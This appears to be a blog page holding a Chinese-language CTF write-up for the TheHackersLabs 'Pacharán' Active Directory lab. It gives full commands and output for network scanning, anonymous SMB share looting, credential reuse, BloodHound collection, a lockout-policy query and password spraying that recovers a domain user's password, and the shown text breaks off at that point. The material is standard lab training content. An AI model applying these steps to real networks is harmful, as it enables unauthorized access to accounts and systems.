<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/wB9gCWCnDino7vEBKVpU-/_buildManifest.js" defer=""></script><script src="/_next/static/wB9gCWCnDino7vEBKVpU-/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsPacharán","contentHtml":"\u003ch1\u003ePacharán\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/61\"\u003ehttps://labs.thehackerslabs.com/machine/61\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nmap -sn 192.168.69.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.69.1\nHost is up (0.00060s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.69.2\nHost is up (0.00034s latency).\nMAC Address: 08:00:27:5F:F4:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.69.69\nHost is up (0.00060s latency).\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.69.10\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 2.10 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nmap -sT -min-rate 10000 -p- 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nWarning: 192.168.69.69 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nStrange \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e error from 192.168.69.69 (104 - \u003cspan class=\"hljs-string\"\u003e'Connection reset by peer'\u003c/span\u003e)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.69.69\nHost is up (0.00020s latency).\nNot shown: 65236 closed tcp ports (conn-refused), 275 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 13.27 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nmap -sT -A -p $(\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003epaste\u003c/span\u003e -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:01 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.69.69\nHost is up (0.00052s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-07-27 12:01:34Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: \u0026#x3C;unknown\u003e, NetBIOS MAC: 08:00:27:4f:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-time:\n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-27T12:01:36\n|_  start_date: 2025-07-27T11:55:15\n|_clock-skew: 6h59m57s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.52 ms 192.168.69.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 16.47 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSMB\u003c/code\u003e 匿名测试\u003c/p\u003e\n\u003cp\u003e可以使用匿名账户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán smbclient -L 192.168.69.69 -U anonymous\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Admin remota\n        C$              Disk      Recurso predeterminado\n        IPC$            IPC       IPC remota\n        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión \n        NETLOGON2       Disk      \n        PACHARAN        Disk      \n        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e$          Disk      Controladores de impresora\n        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión \n        Users           Disk      \nReconnecting with SMB1 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e workgroup listing.\ndo_connect: Connection to 192.168.69.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接用\u003ccode\u003enxc\u003c/code\u003e全部拉下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nxc smb 192.168.69.69 -u \u003cspan class=\"hljs-string\"\u003e'anonymous'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\anonymous: (Guest)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]     STATS_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] EXCLUDE_FILTER: [\u003cspan class=\"hljs-string\"\u003e'print$'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ipc$'\u003c/span\u003e]\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]   EXCLUDE_EXTS: [\u003cspan class=\"hljs-string\"\u003e'ico'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'lnk'\u003c/span\u003e]\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ            \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN                        \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e$                          Controladores de impresora\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users                           \nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] Saved share-file metadata to \u003cspan class=\"hljs-string\"\u003e\"/root/.nxc/modules/nxc_spider_plus/192.168.69.69.json\"\u003c/span\u003e.\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Shares:           10 (ADMIN$, C$, IPC$, NETLOGON, NETLOGON2, PACHARAN, PDF Pro Virtual Printer, \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e$, SYSVOL, Users)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Readable Shares:  2 (IPC$, NETLOGON2)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Filtered Shares:  1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total folders found:  0\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total files found:    1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size average:    22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size min:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size max:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File unique exts:     1 (txt)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Downloads successful: 1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] All files processed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一个 \u003ccode\u003etxt\u003c/code\u003e 文件 \u003ccode\u003eOrujo.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e Orujo.txt                                 \nPericodelospalotes6969#\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e像是一个凭据，测试一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nxc smb 192.168.69.69 -u \u003cspan class=\"hljs-string\"\u003e'orujo'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Pericodelospalotes6969'\u003c/span\u003e --smb-timeout 9999                             \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功拿到 \u003ccode\u003eorujo\u003c/code\u003e 的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nxc ldap 192.168.69.69 -u \u003cspan class=\"hljs-string\"\u003e'orujo'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Pericodelospalotes6969'\u003c/span\u003e                                  \nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969\n\n➜  Pacharán nxc winrm 192.168.69.69 -u \u003cspan class=\"hljs-string\"\u003e'orujo'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Pericodelospalotes6969'\u003c/span\u003e\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\orujo:Pericodelospalotes6969\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003cp\u003e收集信息上\u003ccode\u003eBLoodHound\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán bloodhound-python -d \u003cspan class=\"hljs-string\"\u003e'PACHARAN.thl'\u003c/span\u003e -ns 192.168.69.69 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'WIN-VRU3GG3DPLJ.PACHARAN.THL'\u003c/span\u003e -u orujo -p \u003cspan class=\"hljs-string\"\u003e'Pericodelospalotes6969'\u003c/span\u003e\nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: pacharan.thl\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 17 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 53 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 01S\nINFO: Compressing output into 20250727132554_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当前用户所属组\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e所有域用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e远程管理组成员，只有一个，暂时设定为目标用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eTo Whisky\u003c/h2\u003e\n\u003cp\u003e我们继续枚举一下信息\u003c/p\u003e\n\u003cp\u003e拉取 \u003ccode\u003eorujo\u003c/code\u003e 用户可以下载的所有文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enxc smb 192.168.69.69 -u \u003cspan class=\"hljs-string\"\u003e'orujo'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Pericodelospalotes6969'\u003c/span\u003e --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能下载出来一个 \u003ccode\u003eau.txt\u003c/code\u003e 文件，是一个密码字典\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPachar%C3%A1n/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查询一下密码阈值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  PACHARAN bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'PACHARAN.THL'\u003c/span\u003e -u orujo -p \u003cspan class=\"hljs-string\"\u003e'Pericodelospalotes6969'\u003c/span\u003e --dc-ip 192.168.69.69 get object \u003cspan class=\"hljs-string\"\u003e'DC=PACHARAN,DC=THL'\u003c/span\u003e --attr minPwdLength,maxPwdAge,minPwdAge,pwdHistoryLength,lockoutThreshold,lockoutDuration,lockOutObservationWindow,pwdProperties\n\ndistinguishedName: DC=PACHARAN,DC=THL\nlockOutObservationWindow: -18000000000\nlockoutDuration: -18000000000\nlockoutThreshold: 0\nmaxPwdAge: -42 days, 0:00:00\nminPwdAge: -1 day, 0:00:00\nminPwdLength: 7\npwdHistoryLength: 24\npwdProperties: 1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e密码阈值为\u003ccode\u003e0\u003c/code\u003e ，锁定账户功能被禁用\u003c/p\u003e\n\u003cp\u003e所以我们可以利用得到的字典来进行密码喷洒\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pacharán nxc smb 192.168.69.69 -u users.txt  -p ah.txt --smb-timeout 9999 --continue-on-success | grep \u003cspan class=\"hljs-string\"\u003e'[+]'\u003c/span\u003e\nSMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Whisky:MamasoyStream2er@ 